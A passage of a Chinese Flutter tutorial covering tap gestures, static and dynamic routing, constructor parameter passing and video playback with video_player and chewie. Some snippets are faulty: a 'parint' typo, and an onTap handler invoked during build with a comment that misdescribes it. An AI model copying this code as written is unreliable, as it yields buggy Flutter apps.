<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不传参数的手势。</span></span><br><span class="line"><span class="keyword">new</span> GestureDetector(</span><br><span class="line">    child:Container(</span><br><span class="line">        width: <span class="built_in">double</span>.infinity,</span><br><span class="line">        height: <span class="number">200.0</span>,</span><br><span class="line">        child: Text(<span class="string">&#x27;无参数&#x27;</span>), <span class="comment">// 返回的是自定义的图片组件</span></span><br><span class="line">    ),</span><br><span class="line">    onTap: <span class="keyword">this</span>._videoPlayToggle(), <span class="comment">// 这里是点击图片触发的事件，并且传入一个参数</span></span><br><span class="line">),</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _videoPlayToggle() &#123;</span><br><span class="line">    parint(<span class="string">&#x27;我是onTab事件，无参数&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="路由导航"><a href="#路由导航" class="headerlink" title="路由导航"></a>路由导航</h3><p>在上节手势介绍文章中介绍了onTab事件，那么现在我们就看看app应用的多页面切换吧。看看Flutter的页面切换与 ** React-router ** 有什么不一样。</p>
<p>在Flutter中有着两种路由跳转的方式，一种是静态路由，在创建时就已经明确知道了要跳转的页面和值。另一种是动态路由，跳转传入的目标地址和要传入的值都可以是动态的。</p>
<h4 id="静态路由"><a href="#静态路由" class="headerlink" title="静态路由"></a>静态路由</h4><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/homePage.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/page/aboutPage.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> main()=&gt;runApp(<span class="keyword">new</span> RootPage());</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RootPage</span> <span class="keyword">extends</span> <span class="title">StatelessWidget</span> </span>&#123;</span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            title: <span class="string">&#x27;鹰眼视频&#x27;</span>,</span><br><span class="line">            home: <span class="keyword">new</span> HomePage(),</span><br><span class="line">            routes: &lt;<span class="built_in">String</span>, WidgetBuilder&gt;&#123;</span><br><span class="line">                <span class="string">&#x27;/aboutPage&#x27;</span>: (BuildContext context) =&gt; <span class="keyword">new</span> AboutPage() <span class="comment">// 静态路由配置</span></span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在MaterialApp中，是存在一个叫routers的参数的，用于配置静态路由。</p>
<h4 id="动态路由"><a href="#动态路由" class="headerlink" title="动态路由"></a>动态路由</h4><p>在手势的小节中讲解了，如何去使用手势事件。那么这节继续扩充。点击事件后，让其携带参数切换页面。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span> _videoPlayToggle(id) &#123; <span class="comment">// 这里接收的是，事件传递的参数。</span></span><br><span class="line">    <span class="keyword">return</span> () =&gt; Navigator.of(context).push(</span><br><span class="line">        <span class="keyword">new</span> PageRouteBuilder(</span><br><span class="line">            pageBuilder: (BuildContext context,</span><br><span class="line">                Animation&lt;<span class="built_in">double</span>&gt; animation, <span class="comment">// 切换的动画。</span></span><br><span class="line">                Animation&lt;<span class="built_in">double</span>&gt; secondaryAnimation) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> DetailsPage(id.toString()); <span class="comment">// 这里负责把事件参数，传递到下一个页面。</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>原则就是：“简单的学习，快速的掌握”。至于动画效果，后续优化。先跑下框架结构！</p>
<blockquote>
<p>下一个页面的，参数接收。</p>
</blockquote>
<p>其实就是，通过构造方法实例话对象时传进去。就是这么简单。</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailsPage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> videoId; <span class="comment">// 路由携带的 播放id 参数</span></span><br><span class="line"></span><br><span class="line">    DetailsPage(<span class="keyword">this</span>.videoId); <span class="comment">// 构造方法</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    _DetailsPageState createState() =&gt; _DetailsPageState(<span class="keyword">this</span>.videoId); <span class="comment">// 把 参数再次向下传入。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_DetailsPageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">DetailsPage</span>&gt; </span>&#123;</span><br><span class="line">  <span class="keyword">final</span> <span class="built_in">String</span> _videoId; <span class="comment">// 这里就是 传入的参数，这样就使用视频ID，在相应的生命周期中去获取数据了。</span></span><br><span class="line">  _DetailsPageState(<span class="keyword">this</span>._videoId); <span class="comment">// 构造方法</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>记住，类对象必须构造方法传参数。</p>
<h3 id="视频播放"><a href="#视频播放" class="headerlink" title="视频播放"></a>视频播放</h3><p>视频播放使用了这2个插件，video_player、chewie</p>
<figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:flutter/material.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:video_player/video_player.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:chewie/chewie.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/httpUtil.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/servers/Api.dart&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;package:yysp/model/video_detail.dart&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DetailsPage</span> <span class="keyword">extends</span> <span class="title">StatefulWidget</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> videoId; <span class="comment">// 路由携带的 播放id 参数</span></span><br><span class="line"></span><br><span class="line">    DetailsPage(<span class="keyword">this</span>.videoId);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    _DetailsPageState createState() =&gt; _DetailsPageState(<span class="keyword">this</span>.videoId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_DetailsPageState</span> <span class="keyword">extends</span> <span class="title">State</span>&lt;<span class="title">DetailsPage</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="built_in">String</span> _videoId;</span><br><span class="line">    Video _videoInfo = <span class="keyword">new</span> Video(<span class="number">0</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    <span class="comment">// 实例化播放控制器，通过这个控制器去实现播放、暂停、视频切换。</span></span><br><span class="line">    VideoPlayerController _videoPlayController = <span class="keyword">new</span> VideoPlayerController.network(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    HttpUtil httpUtil = <span class="keyword">new</span> HttpUtil();</span><br><span class="line">    _DetailsPageState(<span class="keyword">this</span>._videoId);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    Widget build(BuildContext context) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MaterialApp(</span><br><span class="line">            home: <span class="keyword">new</span> Scaffold(</span><br><span class="line">                appBar: AppBar(</span><br><span class="line">                    title: Text(</span><br><span class="line">                        <span class="string">&quot;鹰眼视频&quot;</span>,</span><br><span class="line">                        style: <span class="keyword">new</span> TextStyle(fontSize: <span class="number">20.0</span>, letterSpacing: <span class="number">3.0</span>),</span><br><span class="line">                    ),</span><br><span class="line">                    ),</span><br><span class="line">                    body: Column(</span><br><span class="line">                    children: &lt;Widget&gt;[</span><br><span class="line">                        Container(</span><br><span class="line">                        child: <span class="keyword">this</span>._buildVideo()</span><br><span class="line">                        ),</span><br><span class="line">                        Text(_videoInfo.title)</span><br><span class="line">                    ],</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> initState() &#123;</span><br><span class="line">        <span class="keyword">super</span>.initState();</span><br><span class="line">        <span class="keyword">this</span>._getVideoInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@override</span></span><br><span class="line">    <span class="keyword">void</span> dispose() &#123;</span><br><span class="line">        <span class="keyword">super</span>.dispose();</span><br><span class="line">        _videoPlayController.pause();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取网络数据 视频播放详情</span></span><br><span class="line">    <span class="keyword">void</span> _getVideoInfo() <span class="keyword">async</span> &#123;</span><br><span class="line">        <span class="built_in">String</span> url = Api.VideoInfo;</span><br><span class="line">        <span class="keyword">var</span> data = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="keyword">this</span>._videoId&#125;;</span><br><span class="line">        <span class="keyword">var</span> response = <span class="keyword">await</span> HttpUtil().<span class="keyword">get</span>(url, data: data);</span><br><span class="line">        VideoDetail videos = VideoDetail.fromJson(response);</span><br><span class="line">        <span class="keyword">if</span> (videos.code == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 视频获取回来，就初始化 播放控制器</span></span><br><span class="line">        _videoPlayController = VideoPlayerController.network( videos.data.video.src );</span><br><span class="line">        setState(() &#123;</span><br><span class="line">            _videoInfo = <span class="keyword">new</span> Video(videos.data.video.id, videos.data.video.title, videos.data.video.url, videos.data.video.auther, videos.data.video.pubtime, videos.data.video.img, videos.data.video.src, videos.data.video.desc1, videos.data.video.cate, videos.data.video.pt, videos.data.video.collect, videos.data.video.count, videos.data.video.insertTime);</span><br><span class="line">        &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 视频 组件，传递了VideoPlayController控制器</span></span><br><span class="line">    Widget _buildVideo() &#123;</span><br><span class="line">        _videoPlayController.play();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Chewie(</span><br><span class="line">            _videoPlayController,</span><br><span class="line">            aspectRatio: <span class="number">3</span> / <span class="number">2</span>,</span><br><span class="line">            autoPlay: <span class="keyword">true</span>,</span><br><span class="line">            looping: <span class="keyword">false</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>####<br>总结：说了这么多，其实Flutter学的是框架，最主要的是学会dart语言。</p>
]]></content>
      <tags>
        <tag>flutter</tag>
      </tags>
  </entry>
</search>
